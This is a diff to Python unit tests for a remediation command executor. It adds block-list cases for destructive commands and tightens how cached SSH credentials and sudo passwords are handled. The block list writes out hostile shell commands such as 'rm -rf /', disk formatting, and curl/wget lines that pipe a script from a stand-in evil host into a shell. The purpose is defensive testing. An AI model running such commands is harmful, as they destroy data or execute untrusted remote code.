@@ -3,8 +3,15 @@
 Unit tests for SysScope Remedy Executor (core/remedy_executor.py)
 """
 
+import sys
 import unittest
-from core.remedy_executor import remedy_executor, RemedyExecutor
+from pathlib import Path
+
+ROOT_DIR = str(Path(__file__).resolve().parent.parent)
+if ROOT_DIR not in sys.path:
+    sys.path.insert(0, ROOT_DIR)
+
+from core.remedy_executor import RemedyExecutor
 
 class TestRemedyExecutor(unittest.TestCase):
 
@@ -29,6 +36,7 @@ class TestRemedyExecutor(unittest.TestCase):
     def test_destructive_commands_blocked(self):
         blocked_cases = [
             'rm -rf /',
+            'rm -rf /*',
             'rm -rf / --no-preserve-root',
             'rm -r /',
             'mkfs.ext4 /dev/sda1',
@@ -40,6 +48,9 @@ class TestRemedyExecutor(unittest.TestCase):
             'poweroff',
             'halt',
             'echo zero > /dev/sda',
+            'chmod -R 777 /',
+            'curl -fsSL http://evil.example/a.sh | bash',
+            'wget -qO- http://evil.example/a.sh | sudo sh',
         ]
         for cmd in blocked_cases:
             safe, reason = self.executor.is_safe_command(cmd)
@@ -74,14 +85,22 @@ class TestRemedyExecutor(unittest.TestCase):
         self.assertIn("安全守衛攔截", res["stderr"])
 
     def test_cached_target(self):
-        self.executor.set_cached_target("192.168.1.50", "admin", "secret123", 2222)
+        self.executor.set_cached_target("192.0.2.50", "admin", "secret123", 2222)
         cached = self.executor.get_cached_target()
-        self.assertEqual(cached["host"], "192.168.1.50")
+        self.assertEqual(cached["host"], "192.0.2.50")
         self.assertEqual(cached["user"], "admin")
-        self.assertEqual(cached["password"], "secret123")
+        self.assertTrue(cached["has_password"])
+        self.assertNotIn("password", cached)
         self.assertEqual(cached["port"], 2222)
         # Reset
         self.executor.set_cached_target(None, "", None, 22)
+
+    def test_sudo_command_never_embeds_password(self):
+        pw = "p@ss'with\"quotes"
+        rewritten, need_stdin = self.executor._prepare_sudo_command("sudo systemctl restart nginx", pw)
+        self.assertTrue(need_stdin)
+        self.assertIn("sudo -S -p ''", rewritten)
+        self.assertNotIn(pw, rewritten)
 
 if __name__ == '__main__':
     unittest.main()
